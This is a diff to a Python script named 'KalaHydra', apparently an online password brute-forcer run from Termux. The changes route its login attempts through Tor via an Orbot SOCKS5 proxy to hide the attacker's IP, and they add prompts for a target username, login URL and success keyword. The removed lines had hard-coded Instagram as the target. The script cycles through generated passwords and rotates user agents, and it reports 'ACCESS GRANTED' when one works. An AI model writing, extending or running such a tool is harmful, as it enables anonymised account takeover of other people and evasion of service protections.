@@ -1,15 +1,30 @@
 #!/usr/bin/env python3
-import time, math, random, requests, itertools, os
+# KalaHydra Termux Version with Real Orbot/Tor Proxy Integration
+import time
+import math
+import random
+import requests
+import itertools
+import os
 
+# Cyberpunk colors
 GREEN = '\033[92m'
 RED = '\033[91m'
 YELLOW = '\033[93m'
 CYAN = '\033[96m'
 RESET = '\033[0m'
 
+# Kala Time Expansion Function
 def kala_phi(t, tau_div_t=1.6, alpha=0.4, omega=1.3):
     return tau_div_t * (1 + alpha * math.sin(omega * t))
 
+# SOCKS5 Proxy via Orbot
+proxies = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
+
+# Full User-Agent Pool
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
     "Mozilla/5.0 (X11; Linux x86_64)",
@@ -30,7 +45,7 @@ def generate_passwords(charset, min_len, max_len):
 
 def get_ip():
     try:
-        r = requests.get("https://api.ipify.org", timeout=5)
+        r = requests.get("https://api.ipify.org", proxies=proxies, timeout=5)
         return r.text.strip()
     except:
         return "0.0.0.0"
@@ -58,7 +73,7 @@ def start_kalahydra(username, target_url, success_keyword):
         data = {'username': username, 'password': password}
 
         try:
-            r = requests.post(target_url, data=data, headers=headers, timeout=10)
+            r = requests.post(target_url, data=data, headers=headers, proxies=proxies, timeout=10)
             if success_keyword in r.text.lower():
                 print(f"\n{GREEN}✅ ACCESS GRANTED — login: {username} | pass: {password}{RESET}")
                 break
@@ -73,6 +88,12 @@ def start_kalahydra(username, target_url, success_keyword):
     else:
         print(f"\n{RED}⛔ No valid password found.{RESET}")
 
-# Uncomment and run in Termux or terminal
-user = input("***** USER NAME ****** :  ")
-start_kalahydra("user", "https://instagram.com", "dashboard")
+if __name__ == "__main__":
+    try:
+        print(f"{CYAN}🌐 Connecting through Orbot SOCKS5 (127.0.0.1:9050)...{RESET}")
+        username = input(f"{YELLOW}👤 Enter target username: {RESET}")
+        target_url = input(f"{YELLOW}🌐 Enter login URL: {RESET}")
+        success_keyword = input(f"{YELLOW}🔑 Success keyword in response (e.g., dashboard): {RESET}").lower()
+        start_kalahydra(username, target_url, success_keyword)
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}🔻 Terminated by user.{RESET}")
